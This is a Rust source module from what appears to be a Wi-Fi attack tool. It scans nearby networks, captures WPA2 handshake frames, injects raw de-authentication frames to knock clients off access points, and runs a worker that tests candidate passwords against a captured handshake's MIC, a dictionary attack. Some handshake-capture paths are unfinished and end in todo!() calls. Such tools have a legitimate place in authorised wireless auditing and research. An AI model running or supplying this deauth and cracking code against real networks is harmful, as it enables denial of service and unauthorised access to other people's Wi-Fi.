//! # wpa
//! Wi-Fi Protected Access (WPA) is a security certification program developed 
//! by the Wi-Fi Alliance to secure wireless devices networks.
//! 
//! `wpa` contains functions of the tool that are responsible for capturing relevant 
//! information from the handshake stage, collect information about near-by networks, 
//! and send de-authentication to other BSSIDs.
use std::{io::Result,convert::TryFrom, collections::HashMap, collections::HashSet};
use std::time::{SystemTime, UNIX_EPOCH};
use libwifi::{Frame, Addresses, frame::QosData};
use std::io::{Error, Write};
use core::fmt;
use hex::FromHex;

use aux::{IPCMessage, IPC};
use pcap;
use wlan;
use crypto;

type Client = String;

// PACKET PARSING POSITIONS
const SIGNAL_POS: usize = 30;
const FRAME_HEADER_LENGTH: usize = 2;
const EAPOL_MSG_NUM_OFFSET: usize = 0xd;
const EAPOL_CODE_OFFSET: usize = 0x6;
const EAPOL_NONCE_OFFSET: usize = 0x19;
const EAPOL_MIC_OFFSET: usize = 0x59;
const EAPOL_TAG_ID: u16 = 0x888e;
const EAPOL_MSG_1: u16 = 0x8a;
const EAPOL_MSG_2: u16 = 0x10a;
const EAPOL_MSG_3: u16 = 0x13ca;
const EAPOL_MSG_4: u16 = 0x30a;

// WPA IDENTIFICATIONS
const RSN_TAG_ID: u8 = 0x30;
const WPA2_PSK_AKM: u8 = 0x2;
const WPA2_EAP_TLS_AKM: u8 = 0x1;
const WPA2_EAP_PEAP_AKM: u8 = 0x2;
const WPA2_EAP_TTLS_AKM: u8 = 0x3;
const WPA2_EAP_FAST_AKM: u8 = 0x4;
const WPA3_FT_AKM: u8 = 0x9;
const WPA3_SAE_AKM: u8 = 0x8;
const WPA3_SHA256_AKM: u8 = 0x6;
const AES_GROUP_CYPHER_TYPE:u8 = 0x4;
//NOTE: WPA3 needs more accuracy, i.e it can also be 0x2, so an addition condition check is needed
//for identification

// ---------------------------- Macros ----------------------------------------

// simple macro for implementing TryFrom Frame variants to NetworkInfo
macro_rules! impl_try_from {
    ($source:ty) => {
        impl TryFrom<$source> for NetworkInfo {
            type Error = &'static str;

            fn try_from(value: $source) -> std::result::Result<Self, Self::Error> {
                // Conversion logic from $source to $target
                const ERROR_MSG: &'static str = "cannot convert this frame";
                
                //handle wildcard ssid
                let ssid: String = match value.station_info.ssid.clone().ok_or_else(||ERROR_MSG)?.as_str(){
                    "" =>{ "WILDCARD".to_owned() },
                    str =>{ str.to_owned() }
                };

                let bssid: [u8;6] = value.bssid().ok_or_else(||ERROR_MSG)?.0;
                //don't parse broadcast bssid
                if aux::compare_arrays(&bssid,&[0xff,0xff,0xff,0xff,0xff,0xff]){
                    return Err(ERROR_MSG);
                }

                let channel: Option<u8> = None;
                let signal_strength: Option<i8> = None;

                // determine if the client is the sender or the reciever
                //Note: ignoring clients that are not from QoS data or data Frames.
                //let client = match aux::compare_arrays(&bssid, &value.dest().0){
                //    true => { value.src().ok_or_else(||ERROR_MSG)?.0 },
                //    false => { value.dest().0 }
                //};
                
                // let clients: Vec<[u8;6]>;
                // // make sure client is not broadcast
                // if !aux::compare_arrays(&client,&[0xff,0xff,0xff,0xff,0xff,0xff]){
                //     clients = vec![client];
                // }else{
                //     clients = vec![];
                // }
                
                Ok(
                    NetworkInfo{
                    ssid,
                    bssid,
                    channel,
                    signal_strength,
                    clients: vec![],
                    handshake: None,
                    captured_handshakes: HashMap::new(),
                    protocol: identify_protocol(value.station_info.data),
                    last_appearance: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
                    }
                )
            }
        }            
    };
}

// --------------------------------- Structs ----------------------------------




/// contains information about a network
/// ## Description
/// The struct contains the relevant information about a network as captured from the interface.
/// * BSSID - MAC address
/// * SSID - network's name
/// * Channel
/// * Signal strength
/// * Clients - list of connected devices
#[derive(Debug,Clone)]
pub struct NetworkInfo {
    pub bssid: [u8; 6],
    pub ssid: String,
    pub channel: Option<u8>,
    pub signal_strength: Option<i8>,
    pub clients: Vec<[u8;6]>,
    pub protocol: String,
    pub handshake: Option<Handshake>,
    pub last_appearance: u64,
    captured_handshakes: HashMap<Client, [Option<EapolMsg>;4]>,
}

impl PartialEq for NetworkInfo{
    fn eq(&self, other: &Self) -> bool {
        self.ssid == other.ssid && self.bssid == other.bssid
    }

    fn ne(&self, other: &Self) -> bool {
        !self.eq(other)
    }
}

impl Eq for NetworkInfo{}

/// contains the information captured from the handshake
/// ## Description
/// The struct contains the relevant information from the handshake
/// packets in order to build the desired keys.
/// * SSID
/// * A Nonce
/// * B Nonce
/// * Station's MAC adrees
/// * Client's MAC adrees
/// * MIC
#[derive(Debug,Clone)]
pub struct Handshake{
    ssid: String,
    a_nonce: [u8; 32],
    s_nonce: [u8; 32],
    station_mac: [u8; 6],
    client_mac: [u8; 6],
    mic: [u8; 16],
    mic_msg: [u8;121], //the msg for calculating the mic
}

// --------------------------- Traits & methods -------------------------------

impl Handshake{
    // parse the 4 handshake packets
    fn new(ssid: &str, hs_pkts:[Option<EapolMsg>;4]) -> Handshake{
       Handshake { 
            ssid: ssid.to_owned(),
            a_nonce: hs_pkts[0].as_ref().unwrap().msg.data[EAPOL_NONCE_OFFSET..EAPOL_NONCE_OFFSET+32].try_into().unwrap(),
            s_nonce: hs_pkts[1].as_ref().unwrap().msg.data[EAPOL_NONCE_OFFSET..EAPOL_NONCE_OFFSET+32].try_into().unwrap(),
            station_mac: hs_pkts[0].as_ref().unwrap().msg.header.bssid().unwrap().0, //TODO: make sure that is
                                                                     //safe
            client_mac: hs_pkts[0].as_ref().unwrap().msg.header.address_1.0,
            mic: hs_pkts[1].as_ref().unwrap().msg.data[EAPOL_MIC_OFFSET..EAPOL_MIC_OFFSET+16].try_into().unwrap(),
            mic_msg: crypto::mic_data(hs_pkts[1].as_ref().unwrap().msg.data[8..129].try_into().unwrap()),
        } 
    }

    /// Checks if a certain password belongs to the network by trying to generate the keys and 
    /// compare the MIC to the given MIC from the handshake.
    pub fn try_password(self,password: &str) -> bool{
        //generate PSK
        let psk = crypto::generate_psk(password, &self.ssid);
        //generate KCK
        let kck = crypto::generate_kck(&psk, &self.client_mac, &self.station_mac, &self.a_nonce, &self.s_nonce);
        //calculate the MIC
        let mic:[u8;16] = crypto::digest_hmac_sha1(&kck, &self.mic_msg)[..16].try_into().unwrap();
        //compare the MIC
        aux::compare_arrays(&mic,&self.mic)
    }

}

impl fmt::Display for Handshake{
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f,"- ssid:{}\n- bssid: {}\n- client: {}\n- ANONCE: {}\n- SNONCE: {}\n- MIC: {}\n- MIC MSG: {}\n\n",
                self.ssid, hex::encode(self.station_mac),
                hex::encode(self.client_mac), hex::encode(self.a_nonce), 
                hex::encode(self.s_nonce),hex::encode(self.mic),
                hex::encode(self.mic_msg)
        )
    }
}

impl NetworkInfo{
    pub fn update(&mut self,other: &mut NetworkInfo){
        self.channel = other.channel;
        self.signal_strength = other.signal_strength;
        self.clients.append(other.clients.as_mut());
        //remove duplications
        self.clients.sort();
        self.clients.dedup();
        self.last_appearance = other.last_appearance;
        if !self.handshake.is_some(){
            self.handshake = other.handshake.clone();//TODO:check if needed
        }
    }

    //adds eapol msg and create hs instance if has all of the 4 messages
    //EAT SPAGETTI
    pub fn add_eapol(&mut self, eapol: EapolMsg){
        //dont add if has HS already
        if self.handshake.is_some(){
            return;
        }

        let client = eapol.client.clone();
        let msg_nu = match eapol.msg_nu{
            EAPOL_MSG_1 => 1,
            EAPOL_MSG_2 => 2,
            EAPOL_MSG_3 => 3,
            EAPOL_MSG_4 => 4,
            _ => 0
        };
        if msg_nu == 0{ //incase of invalid msg_nu
            return;
        }

        let mut eapol_msgs = [None,None,None,None];
        let prev_captured = self.captured_handshakes.get(&client);
        match prev_captured {
            Some(client_captured_msgs) => {
                eapol_msgs = client_captured_msgs.clone();
                //if captured this msg already
                if eapol_msgs[msg_nu-1].is_some(){
                    //insert and reset the others
                    eapol_msgs = [None,None,None,None];
                    eapol_msgs[msg_nu-1] = Some(eapol.clone());
                }
                else{
                    //TODO add timestamp check
                    eapol_msgs[msg_nu-1] = Some(eapol.clone());

                    //check if can build hs (has all 4 messages)
                    let num_of_captured = eapol_msgs.iter().fold(0, |acc,e| match e {Some(_) => acc+1,None => acc});
                    if num_of_captured == 4{
                        let hs = Handshake::new(&self.ssid,eapol_msgs.clone());
                        self.handshake =Some(hs);
                    }
                }
                self.captured_handshakes.remove(&client);//remove for and insert later with updated
            },
            None =>{
                eapol_msgs[msg_nu-1] = Some(eapol);
            }
        }
        self.captured_handshakes.insert(client, eapol_msgs);
    }
}

//TODO:update this
impl fmt::Display for NetworkInfo {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f,"{} | {} | {} | {} | ",
            self.ssid,
            self.channel.unwrap_or(0),
            self.signal_strength.unwrap_or(0),
            hex::encode(self.bssid)
        );
        for client in &self.clients{
            write!(f,"{}\n", hex::encode(client));
        }
        Ok(())
    }
}

impl_try_from!(libwifi::frame::Beacon);
impl_try_from!(libwifi::frame::ProbeRequest);
impl_try_from!(libwifi::frame::ProbeResponse);
impl_try_from!(libwifi::frame::AssociationRequest);
impl_try_from!(libwifi::frame::AssociationResponse);
//impl_try_from!(libwifi::frame::QosData);

impl TryFrom<libwifi::frame::QosNull> for NetworkInfo {
    type Error = &'static str;

    fn try_from(value: libwifi::frame::QosNull) -> std::result::Result<Self, Self::Error> {
        // Conversion logic from $source to $target
        const ERROR_MSG: &'static str = "cannot convert this frame";
        

        let bssid: [u8;6] = value.bssid().ok_or_else(||ERROR_MSG)?.0;
        //don't parse broadcast bssid
        if aux::compare_arrays(&bssid,&[0xff,0xff,0xff,0xff,0xff,0xff]){
            return Err(ERROR_MSG);
        }

        let channel: Option<u8> = None;
        let signal_strength: Option<i8> = None;

        // determine if the client is the sender or the reciever
        let client = match aux::compare_arrays(&bssid, &value.dest().0){
            true => { value.src().ok_or_else(||ERROR_MSG)?.0 },
            false => { value.dest().0 }
        };
        
         let clients: Vec<[u8;6]>;
         // make sure client is not broadcast
         if !aux::compare_arrays(&client,&[0xff,0xff,0xff,0xff,0xff,0xff]){
             clients = vec![client];
         }else{
             clients = vec![];
         }
        
        Ok(
            NetworkInfo{
            ssid:"".to_owned(),
            bssid,
            channel,
            signal_strength,
            clients,
            handshake: None,
            captured_handshakes: HashMap::new(),
            protocol: "unknown".to_owned(),
            last_appearance: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
            }
        )
    }
}            
impl TryFrom<libwifi::Frame> for NetworkInfo{
    type Error = &'static str;
    fn try_from(value: libwifi::Frame) -> std::result::Result<Self, Self::Error> {
       match value{
            libwifi::Frame::Beacon(beacon) =>{
                Ok(beacon.try_into()?)
            },
            libwifi::Frame::ProbeRequest(probe_req) =>{
                Ok(probe_req.try_into()?)
            },
            libwifi::Frame::ProbeResponse(probe_res) =>{
                Ok(probe_res.try_into()?)
            },
            libwifi::Frame::AssociationRequest(assoc_req) =>{
                Ok(assoc_req.try_into()?)
            },
            libwifi::Frame::AssociationResponse(assoc_res) =>{
                Ok(assoc_res.try_into()?)
            },
            libwifi::Frame::QosNull(qos_null) =>{
                Ok(qos_null.try_into()?)
            },
            _ => {
                Err("cannot convert frame")
            }

        } 
    }
}

// --------------------------- Public Functions -------------------------------

//A worker for cracking the network's password
pub fn password_worker(ipc: IPC<String>,handshake: Handshake){
    loop {
        if let Ok(ipc_msg) = ipc.rx.recv(){
            match ipc_msg{
                IPCMessage::Message(password) =>{
                    println!("[-] trying: {}",&password);
                    if handshake.clone().try_password(&password){
                        ipc.tx.send(IPCMessage::Message(password));
                        return;
                    }else{
                        ipc.tx.send(IPCMessage::Message("wrong".to_owned()));
                    }
                },
                IPCMessage::EndCommunication => {
                    return;
                },
                _ => {
                    continue;
                }
            }
        }
    }
}

/// Capture a handshake from a PCAP file
/// ## Description 
/// The function receives interface, PCAP file, ssid and bssid and scans for 4 EAPOL 
/// packets of the given station and client. Then extract the relevant data from each 
/// packet (A Nonce, B Nonce, MIC, MIC message), and returns it as a struct.
/// ## Example
/// **Basic usage:**
/// ```
///     let pcap: Result<pcap::Capture<pcap::Offline>, pcap::Error> =
///                                       pcap::Capture::from_file("pcap_file.pcap");
///     let handshake = wpa::get_hs_from_file(pcap.unwrap(), "test", "AABBCCDDEEFF");
/// ```
pub fn get_hs_from_file(mut pcap: pcap::Capture<pcap::Offline>,ssid: &str, bssid: &str) -> std::io::Result<Handshake> {
    let mut hs_msgs: [Option<libwifi::frame::QosData>; 4] = Default::default();
    loop { //TODO: replace with timeout
        let frame;
        match pcap.next_packet() { //listen for the next frame 
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout TODO: timeout check could be checked here
        }
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize;
        //parse the 802.11 frame
        let parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        if parsed_frame.is_err() {
            continue; //TODO: check what gets here
        }

        //filter only QoS Data frames
        if let Frame::QosData(qos) = parsed_frame.unwrap() {
            // check if msg type is EAPOL
            let msg_type: u16 = ((qos.data[EAPOL_CODE_OFFSET] as u16) << 8) | qos.data[EAPOL_CODE_OFFSET+1] as u16;
            if msg_type == EAPOL_TAG_ID {// EAPOL
                // get hs message number
                let msg_num: u16 = ((qos.data[EAPOL_MSG_NUM_OFFSET] as u16) << 8) | qos.data[EAPOL_MSG_NUM_OFFSET+1] as u16;
                match msg_num {
                    EAPOL_MSG_1 =>{
                        // check the bssid
                        if hex::encode(qos.header.address_3.0) == bssid{
                            hs_msgs[0] = Some(qos);
                        }
                    },

                    EAPOL_MSG_2 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[0].is_some() {
                            hs_msgs[1] = Some(qos);
                        }
                    },
                    EAPOL_MSG_3 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[1].is_some() {
                            hs_msgs[2] = Some(qos);
                        }
                    },

                    EAPOL_MSG_4 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[2].is_some() {
                            hs_msgs[3] = Some(qos);
                        }
                    },

                    _ => {todo!();} //TODO: handle error with parsing
                }
                if hs_msgs.iter().all(|m|m.is_some()){
                    //TODO: FIX!
                    todo!()
                    // return Ok(Handshake::new(ssid,hs_msgs));
                }
            }
        }
    }
}

/// Capture a handshake while listening
/// ## Description 
/// The function receives interface, ssid and bssid and listens until capturing 4 EAPOL 
/// packets of the given station and client. Then extract the relevant data from each 
/// packet (A Nonce, B Nonce, MIC, MIC message), and returns it as a struct.
/// ## Example
/// **Basic usage:**
/// ```
///     let handshake = wpa::get_hs("wlan0", "test", "AABBCCDDEEFF");
/// ```
pub fn get_hs(iface: &str,ssid: &str, bssid: &str) -> std::io::Result<Handshake> {
    // get recv channel to the interface
    let mut rx = wlan::get_recv_channel(iface)?;
    let mut hs_msgs: [Option<libwifi::frame::QosData>; 4] = Default::default();
    loop { //TODO: replace with timeout
        let frame;
        match rx.next() { //listen for the next frame 
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout TODO: timeout check could be checked here
        }
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize;
        //parse the 802.11 frame
        let parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        if parsed_frame.is_err() {
            continue; //TODO: check what gets here
        }

        //filter only QoS Data frames
        if let Frame::QosData(qos) = parsed_frame.unwrap() {
            // check if msg type is EAPOL
            let msg_type: u16 = ((qos.data[EAPOL_CODE_OFFSET] as u16) << 8) | qos.data[EAPOL_CODE_OFFSET+1] as u16;
            if msg_type == EAPOL_TAG_ID {// EAPOL
                // get hs message number
                let msg_num: u16 = ((qos.data[EAPOL_MSG_NUM_OFFSET] as u16) << 8) | qos.data[EAPOL_MSG_NUM_OFFSET+1] as u16;
                match msg_num {
                    EAPOL_MSG_1 =>{
                        // check the bssid
                        if hex::encode(qos.header.address_3.0) == bssid{
                            hs_msgs[0] = Some(qos);
                        }
                    },

                    EAPOL_MSG_2 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[0].is_some() {
                            hs_msgs[1] = Some(qos);
                        }
                    },
                    EAPOL_MSG_3 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[1].is_some() {
                            hs_msgs[2] = Some(qos);
                        }
                    },

                    EAPOL_MSG_4 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[2].is_some() {
                            hs_msgs[3] = Some(qos);
                        }
                    },

                    _ => {todo!();} //TODO: handle error with parsing
                }
                if hs_msgs.iter().all(|m|m.is_some()){
                    //TODO: FIX ME!
                    todo!();
                    //return Ok(Handshake::new(ssid,hs_msgs));
                }
            }
        }
    }
}

/// Send de-auth to a specific client or broadcast from a given station
/// ## Description
/// The functions receives interface, BSSID of a station and a target's BSSID.
/// The interface sends De-authentication packet from a given BSSID
/// to a specific client or broadcast if terget is None.
/// ## Example
/// **Basic usage:**
/// ```
///     let client: String = "FFEEDDCCBBAA".to_string();
///     // send de-auth from station AA:BB:CC:DD:EE:FF to client FF:EE:DD:CC:BB:AA
///     wpa::send_deauth("wlan1", "AABBCCDDEEFF", Some(client));
///     // will be sent broadcast
///     wpa::send_deauth("wlan1", "AABBCCDDEEFF", None);
/// ```
pub fn send_deauth(iface: &str, bssid: &str, target: Option<String>) -> std::io::Result<()>{
    // get a sender channel to the iface
    let mut tx = wlan::get_send_channel(iface)?;
    
    let target = target.as_deref().unwrap_or("ffffffffffff");// if None, broadcast

    //build the frame
    let radiotap_header = Vec::from_hex("00000c000480000002001800").unwrap();
    let deauth_msg = Vec::from_hex(format!("c0003a01{target}{bssid}{bssid}00000700")).unwrap();  //TODO:replay for debugging

    let frame = &[radiotap_header,deauth_msg].concat()[..];
    // send
    let iface = wlan::get_interface(iface).ok_or(Error::last_os_error())?;
    tx.send_to(frame,Some(iface)).unwrap().unwrap();
    Ok(())
}

/// Collects information about near-by networks and devices
/// ## Description
/// The functions receives interface and time interval that specifies how 
/// much time to listen, and scans for networks and devices. It parses 
/// every packet and saves the relevant information about the network such 
/// as SSID, BSSID, signal strength and channel. If the network is already 
/// familier, it updates the information.
/// The function stops after the given time and returns a HashMap of all 
/// the near-by networks.
/// ## Example
/// **Basic usage:**
/// ```
///     let stations = wpa::listen_and_collect("wlan0", std::time::Duration::from_secs(60));
/// ```
pub fn listen_and_collect(iface: &str, interval: std::time::Duration) -> Result<Vec<ParsedFrame>> {

    let mut networks : Vec<ParsedFrame> = vec![];
    let current_channel = wlan::get_iface_channel(iface)?;

    // get rx channel to the given interface
    let mut rx = wlan::get_recv_channel(iface)?;
    //read time 
    let init_time = std::time::Instant::now();

    while init_time.elapsed() <= interval {

        let frame;
        //try to read next frame
        match rx.next() {
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout
        }
        
        //parse frame
        let parsed_frame;
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize; 
        if frame_offset < frame.len(){
            parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        }else{
            parsed_frame = Err(libwifi::error::Error::UnhandledProtocol("unknown message".to_owned()));
        }

        if parsed_frame.is_err() {continue;} //TODO: try to parse better. might be other versions beside WPA2

        // extract data
        let signal = frame[SIGNAL_POS] as i8; //extract signal
        let msg: std::result::Result<ParsedFrame,&str> = parsed_frame.unwrap().try_into();
        if let Ok(msg) = msg{
                match msg{
                    ParsedFrame::Network(network)=>{
                        let mut network = network.clone();
                        network.channel = Some(current_channel);
                        network.signal_strength = Some(signal);
                        networks.push(ParsedFrame::Network(network));
                    },
                    ParsedFrame::Eapol(eapol)=>{
                        networks.push(ParsedFrame::Eapol(eapol)) 
                    },
                }
        } else{
            continue;
        }
    }
    Ok(networks)
}



//parsed frame
pub enum ParsedFrame{
    Network(NetworkInfo),
    Eapol(EapolMsg)
}

#[derive(Debug,Clone)]
pub struct EapolMsg{
    pub bssid: String,
    pub client: String,
    pub msg_nu: u16,
    pub msg: libwifi::frame::QosData,
    pub timestamp: u64,
}

impl TryFrom<libwifi::frame::QosData> for EapolMsg{
    type Error = &'static str;
    fn try_from(value: libwifi::frame::QosData) -> std::result::Result<Self, Self::Error> {
        const ERROR_MSG: &'static str = "cannot convert this frame";
        //check if EAPOL
        let msg_type: u16 = ((value.data[EAPOL_CODE_OFFSET] as u16) << 8) | value.data[EAPOL_CODE_OFFSET+1] as u16;
        if msg_type != EAPOL_TAG_ID {// Not EAPOL
            return Err(ERROR_MSG);
        }
        let bssid = value.bssid().ok_or_else(||ERROR_MSG)?.0;
        Ok(EapolMsg{
            bssid: hex::encode(bssid), // store as String
            client: match aux::compare_arrays(&bssid, &value.dest().0){
                    true => { hex::encode(value.src().ok_or_else(||ERROR_MSG)?.0) },
                    false => { hex::encode(value.dest().0) }},
            msg_nu: ((value.data[EAPOL_MSG_NUM_OFFSET] as u16) << 8) | value.data[EAPOL_MSG_NUM_OFFSET+1] as u16,
            msg: value,
            timestamp: SystemTime::now().duration_since(UNIX_EPOCH)
                .map_err(|_|ERROR_MSG)?.as_secs(),
        })
    }
}

impl TryFrom<libwifi::Frame> for ParsedFrame{
    type Error = &'static str;
    fn try_from(value: libwifi::Frame) -> std::result::Result<Self, Self::Error> {
       match value{
            libwifi::Frame::Beacon(beacon) =>{
                Ok(ParsedFrame::Network(beacon.try_into()?))
            },
            libwifi::Frame::ProbeRequest(probe_req) =>{
                Ok(ParsedFrame::Network(probe_req.try_into()?))
            },
            libwifi::Frame::ProbeResponse(probe_res) =>{
                Ok(ParsedFrame::Network(probe_res.try_into()?))
            },
            libwifi::Frame::AssociationRequest(assoc_req) =>{
                Ok(ParsedFrame::Network(assoc_req.try_into()?))
            },
            libwifi::Frame::AssociationResponse(assoc_res) =>{
                Ok(ParsedFrame::Network(assoc_res.try_into()?))
            },
            libwifi::Frame::QosNull(qos_null) =>{
                Ok(ParsedFrame::Network(qos_null.try_into()?))
            },
            libwifi::Frame::QosData(qos) =>{
                Ok(ParsedFrame::Eapol(qos.try_into()?))
            },
            _ => {
                Err("cannot convert frame")
            }
        } 
    }
}

fn identify_protocol(data: Vec<(u8,Vec<u8>)>) -> String{
    let rsn_field = data.iter().find(|(i,_)|*i == RSN_TAG_ID);
    if let Some((_,rsn_data)) = rsn_field{
        let akm_type = rsn_data[17];
        let group_cypher_type = rsn_data[5];

        match akm_type{
            WPA2_PSK_AKM | WPA2_EAP_PEAP_AKM => {
                if group_cypher_type == AES_GROUP_CYPHER_TYPE{
                    return "WPA2-PSK".to_owned();
                }else{
                    return "WPA2-EAP".to_owned();
                }
            },
            WPA2_EAP_TLS_AKM | WPA2_EAP_FAST_AKM | WPA2_EAP_TTLS_AKM =>{
                return "WPA2-EAP".to_owned(); 
            },
            WPA3_SAE_AKM | WPA3_FT_AKM | WPA3_SHA256_AKM => {
                return "WPA3".to_owned();
            },
            _ => {}
        }
    }
    return "unknown".to_owned()
}
